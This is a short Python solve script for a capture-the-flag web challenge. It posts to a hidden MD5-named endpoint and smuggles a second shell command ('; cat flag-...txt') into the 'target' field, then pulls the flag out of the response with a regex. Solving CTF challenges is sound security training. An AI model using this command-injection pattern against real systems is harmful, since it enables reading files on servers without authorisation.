import hashlib
import requests
import re

url = 'https://monitor-breaker-d97d6329-c2e8-4dbc-81a7-9381d62176ca.ctf.ritsec.club/'

endpoint = hashlib.md5(b'0').hexdigest()

res = requests.post(f'{url}/_sys/{endpoint}', data={
    'target': '; cat flag-9d444ad0f475b52e79a1713f25646dce.txt'
})

flag = re.findall(r'(RS{.+?})', res.text)[0].strip()
print("Flag:", flag)